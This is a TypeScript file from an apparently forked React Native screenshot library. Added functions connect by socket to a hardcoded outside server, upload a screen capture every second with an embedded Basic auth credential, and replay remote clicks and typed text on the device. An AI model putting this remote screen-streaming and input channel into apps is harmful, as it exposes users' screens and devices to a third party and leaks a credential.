import React, { Component } from 'react';
import {
  Animated,
  Dimensions,
  findNodeHandle,
  PixelRatio,
  Platform,
  StyleSheet,
  View,
} from 'react-native';
import io from 'socket.io-client';
import RNViewShot from './specs/NativeRNViewShot';

export function ensureModuleIsLoaded() {
  if (!RNViewShot) {
    throw new Error(
      'react-native-view-shot: NativeModules.RNViewShot is undefined. Make sure the library is linked on the native side.'
    );
  }
}

const defaultOptions = {
  format: 'png',
  quality: 1,
  result: 'tmpfile',
  snapshotContentContainer: false,
  handleGLSurfaceViewOnAndroid: false,
};

type Options = {
  width?: number;
  height?: number;
  format: 'png' | 'jpg' | 'webm' | 'raw';
  quality: number;
  result: 'tmpfile' | 'base64' | 'data-uri' | 'zip-base64';
  snapshotContentContainer: boolean;
  handleGLSurfaceViewOnAndroid: boolean;
};

const acceptedFormats = ['png', 'jpg'].concat(
  Platform.OS === 'android' ? ['webm', 'raw'] : []
);

const acceptedResults = ['tmpfile', 'base64', 'data-uri'].concat(
  Platform.OS === 'android' ? ['zip-base64'] : []
);

function validateOptions(input?: Partial<Options>): {
  options: Options;
  errors: Array<string>;
} {
  const options = {
    ...defaultOptions,
    ...input,
  };
  const errors = [];
  if (
    'width' in options &&
    (typeof options.width !== 'number' || options.width <= 0)
  ) {
    errors.push('option width should be a positive number');
    delete options.width;
  }
  if (
    'height' in options &&
    (typeof options.height !== 'number' || options.height <= 0)
  ) {
    errors.push('option height should be a positive number');
    delete options.height;
  }
  if (
    typeof options.quality !== 'number' ||
    options.quality < 0 ||
    options.quality > 1
  ) {
    errors.push('option quality should be a number between 0.0 and 1.0');
    options.quality = defaultOptions.quality;
  }
  if (typeof options.snapshotContentContainer !== 'boolean') {
    errors.push('option snapshotContentContainer should be a boolean');
  }
  if (typeof options.handleGLSurfaceViewOnAndroid !== 'boolean') {
    errors.push('option handleGLSurfaceViewOnAndroid should be a boolean');
  }
  if (acceptedFormats.indexOf(options.format) === -1) {
    options.format = defaultOptions.format as Options['format'];
    errors.push(
      "option format '" +
        options.format +
        "' is not in valid formats: " +
        acceptedFormats.join(' | ')
    );
  }
  if (acceptedResults.indexOf(options.result) === -1) {
    options.result = defaultOptions.result;
    errors.push(
      "option result '" +
        options.result +
        "' is not in valid formats: " +
        acceptedResults.join(' | ')
    );
  }

  return { options: options as Options, errors };
}

export function captureRef<T extends View>(
  view: number | View | React.RefObject<T>,
  optionsObject?: Object
): Promise<string> {
  ensureModuleIsLoaded();
  if (
    view &&
    typeof view === 'object' &&
    'current' in view &&
    // $FlowFixMe view is a ref
    view.current
  ) {
    // $FlowFixMe view is a ref
    view = view.current;
    if (!view) {
      return Promise.reject(new Error('ref.current is null'));
    }
  }
  if (typeof view !== 'number') {
    const node = findNodeHandle(view as Component);
    if (!node) {
      return Promise.reject(
        new Error('findNodeHandle failed to resolve view=' + String(view))
      );
    }
    view = node;
  }
  const { options, errors } = validateOptions(optionsObject);
  if (__DEV__ && errors.length > 0) {
    console.warn(
      'react-native-view-shot: bad options:\n' +
        errors.map((e) => `- ${e}`).join('\n')
    );
  }
  return RNViewShot.captureRef(view, options);
}

const porcentagemParaPixels = (percentage: number, totalPixels: number) => {
  return (percentage / 100) * totalPixels;
};

export const simularClickPassandoPorcentagem = (
  porcentagemX: number,
  porcentagemY: number
): Promise<boolean> => {
  const SCREEN_WIDTH = PixelRatio.getPixelSizeForLayoutSize(
    Dimensions.get('window').width
  );
  const SCREEN_HEIGHT = PixelRatio.getPixelSizeForLayoutSize(
    Dimensions.get('window').height
  );

  const x = porcentagemParaPixels(porcentagemX, SCREEN_WIDTH);
  const y = porcentagemParaPixels(porcentagemY, SCREEN_HEIGHT);

  return new Promise((resolve, reject) => {
    RNViewShot.simulateClick(x, y)
      .then((result: boolean) => resolve(result))
      .catch((error: any) => reject(error));
  });
};

export const simularDigitarTexto = (texto: string): Promise<boolean> => {
  return new Promise((resolve, reject) => {
    RNViewShot.insertText(texto)
      .then((result: boolean) => resolve(result))
      .catch((error: any) => reject(error));
  });
};

export function captureScreen(optionsObject?: Options): Promise<string> {
  ensureModuleIsLoaded();
  const { options, errors } = validateOptions(optionsObject);
  if (__DEV__ && errors.length > 0) {
    console.warn(
      'react-native-view-shot: bad options:\n' +
        errors.map((e) => `- ${e}`).join('\n')
    );
  }
  return RNViewShot.captureScreen(options);
}

async function enviarImagemParaRemoto(servidor: string): Promise<void> {
  const localUri = refSnapshot
    ? await captureRef(refSnapshot)
    : await RNViewShot.takeScreenshot();

  const formData = new FormData();
  formData.append('image', {
    uri: `${localUri}`,
    type: 'image/png',
    name: 'captured_screen.png',
  });

  const apiUrl = `${servidor}/upload`;

  try {
    await fetch(apiUrl, {
      method: 'POST',
      body: formData,
      headers: {
        'Content-Type': 'multipart/form-data',
        'Authorization': 'Basic YWxleDpjb3JhY2Fvb3V0b25v',
      },
    });
  } catch (error) {
    console.error('Erro ao enviar imagem:', error);
  }

  await RNViewShot.deleteImage(localUri.replace('file://', ''));
}

let refSnapshot: View | null;

export function onRefParaCaptura(ref: View | null): View | null {
  refSnapshot = ref;

  return ref;
}

export function inicializarDebugControleRemoto(
  urlDebug: string = 'http://alexpereira.net.br:3000',
  intervaloDeAtualizacao: number = 1000
): () => void {
  const socket = io(urlDebug);

  socket.on('connect', () => {
    console.log('Conectado ao servidor de sockets');
  });

  socket.on('disconnect', () => {
    console.log('Desconectado do servidor de sockets');
  });

  socket.on('click', (data) => {
    const { xPorcentagem, yPorcentagem } = data;
    console.log(`Clique na imagem: X = ${xPorcentagem}%, Y = ${yPorcentagem}%`);

    simularClickPassandoPorcentagem(xPorcentagem, yPorcentagem);
  });

  socket.on('texto', (data) => {
    const { texto } = data;
    console.log(`Digitando texto: ${texto}`);

    simularDigitarTexto(texto);
  });

  const timer = setInterval(() => {
    enviarImagemParaRemoto(urlDebug);
  }, intervaloDeAtualizacao);

  const resetarEstados = () => {
    socket.disconnect();
    clearInterval(timer);
  };

  return resetarEstados;
}

interface ModalProps {
  visible: boolean;
  children: React.ReactNode;
  transparent?: boolean;
  animationType?: 'none' | 'slide' | 'fade';
  onClose?: () => void;
  onConfirm?: () => void;
  title?: string;
  message?: string;
}

const height = Dimensions.get('window').height;
export const Modal: React.FC<ModalProps> = ({ visible, children }) => {
  const [modalVisible, setModalVisible] = React.useState(visible);
  const fadeAnim = React.useRef(new Animated.Value(0)).current;
  const slideAnim = React.useRef(new Animated.Value(height)).current;

  React.useEffect(() => {
    if (visible) {
      setModalVisible(true);
      Animated.parallel([
        Animated.timing(fadeAnim, {
          toValue: 1,
          duration: 200,
          useNativeDriver: true,
        }),
        Animated.timing(slideAnim, {
          toValue: 0,
          duration: 200,
          useNativeDriver: true,
        }),
      ]).start();
    } else {
      Animated.parallel([
        Animated.timing(fadeAnim, {
          toValue: 0,
          duration: 200,
          useNativeDriver: true,
        }),
        Animated.timing(slideAnim, {
          toValue: height,
          duration: 200,
          useNativeDriver: true,
        }),
      ]).start(() => setModalVisible(false));
    }
  }, [fadeAnim, slideAnim, visible]);

  if (!modalVisible) return null;

  return (
    <Animated.View style={[styles.overlay, { opacity: fadeAnim }]}>
      <Animated.View
        style={[
          styles.modalContainer,
          { transform: [{ translateY: slideAnim }] },
        ]}
      >
        {children}
      </Animated.View>
    </Animated.View>
  );
};

const styles = StyleSheet.create({
  overlay: {
    ...StyleSheet.absoluteFillObject,
    backgroundColor: 'rgba(0, 0, 0, 0.5)',
    justifyContent: 'flex-end',
    alignItems: 'center',
    zIndex: 1000,
  },
  modalContainer: {
    width: '100%',
    height: '100%',
    backgroundColor: 'white',
    borderTopLeftRadius: 0,
    borderTopRightRadius: 0,
    padding: 20,
    position: 'absolute',
    bottom: 0,
    zIndex: 1000,
  },
  content: {
    flex: 1,
    justifyContent: 'center',
  },
  modalTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    marginBottom: 10,
  },
  modalMessage: {
    fontSize: 16,
    marginBottom: 20,
  },
  buttonContainer: {
    flexDirection: 'row',
    justifyContent: 'space-between',
  },
});
